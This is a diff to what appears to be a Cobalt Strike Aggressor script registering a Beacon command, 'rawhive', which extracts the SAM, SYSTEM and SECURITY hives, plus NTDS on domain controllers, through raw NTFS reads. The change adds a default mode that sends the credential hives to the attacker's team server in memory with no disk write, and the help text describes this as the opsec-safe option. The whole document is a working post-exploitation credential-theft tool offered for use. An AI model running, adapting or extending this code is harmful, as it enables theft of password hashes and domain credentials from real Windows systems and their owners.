@@ -1,18 +1,33 @@
 alias rawhive {
-    local('$bid $volume $outpath $args $handle $data');
+    local('$bid $volume $outpath $download $args $handle $data $arg $idx');
     $bid = $1;
 
-    if ($3 eq "") {
-        $volume  = "C";
-        $outpath = $2;
-    } else {
-        $volume  = $2;
-        $outpath = $3;
+    $volume  = "C";
+    $outpath = "";
+    $download = 0;
+    @pos = @();
+
+    for ($idx = 1; $idx < size(@_); $idx++) {
+        push(@pos, @_[$idx]);
     }
 
-    if ($outpath eq "") {
-        berror($bid, "rawhive: outdir required  e.g.  rawhive C:\\Windows\\Temp  or  rawhive C C:\\Windows\\Temp");
-        return;
+    if ($download || size(@pos) == 0) {
+        $download = 1;
+        if (size(@pos) >= 1) { $volume = @pos[0]; }
+    } else if (size(@pos) == 1) {
+        $arg = @pos[0];
+        if (strlen($arg) == 1) {
+            $download = 1;
+            $volume = $arg;
+        } else if (strlen($arg) == 2 && substr($arg, 1) eq ":") {
+            $download = 1;
+            $volume = substr($arg, 0, 1);
+        } else {
+            $outpath = $arg;
+        }
+    } else {
+        $outpath = @pos[0];
+        $volume  = @pos[1];
     }
 
     if (strlen($volume) == 2 && substr($volume, 1, 1) eq ":") {
@@ -36,18 +51,29 @@ alias rawhive {
         return;
     }
 
-    $args = bof_pack($bid, "zz", $volume, $outpath);
+    $args = bof_pack($bid, "zzi", $volume, $outpath, $download);
 
-    btask($bid, "RawHive: extracting SAM/SYSTEM/SECURITY [+NTDS on DCs] to $outpath");
+    if ($download) {
+        btask($bid, "RawHive: extracting SAM/SYSTEM/SECURITY [+NTDS on DCs] to team server (no disk write)");
+    } else {
+        btask($bid, "RawHive: extracting SAM/SYSTEM/SECURITY [+NTDS on DCs] to $outpath");
+    }
     beacon_inline_execute($bid, $data, "go", $args);
 }
 
 beacon_command_register(
     "rawhive",
-    "Extract SAM/SYSTEM/SECURITY [+NTDS on DCs] via raw NTFS, write to disk as .tmp files",
-    "Usage: rawhive [volume] <outdir>\n" .
-    "  volume  Drive letter to read (default: C)\n" .
-    "  outdir  Target directory (e.g. C:\\Windows\\Temp)\n" .
-    "Example: rawhive d C:\\Temp  reads D: and writes output to C:\\Temp\n\n" .
+    "Extract SAM/SYSTEM/SECURITY [+NTDS on DCs] via raw NTFS",
+    "Usage: rawhive [volume]              download to team server (default)\n" .
+    "       rawhive <outdir> [volume]     write hives to disk\n\n" .
+    "  volume      drive letter to read (default: C)\n" .
+    "  outdir      target directory for disk write mode\n\n" .
+    "Download mode is in-memory via BeaconDownload and never touches the\n" .
+    "target disk. Disk write mode does and may not be opsec safe.\n\n" .
+    "Examples:\n" .
+    "  rawhive                            download C: hives to team server\n" .
+    "  rawhive D                          download D: hives to team server\n" .
+    "  rawhive C:\\Windows\\Temp            write C: hives to disk\n" .
+    "  rawhive C:\\Temp D                  write D: hives to C:\\Temp\n\n" .
     "Requires local admin or SYSTEM."
 );
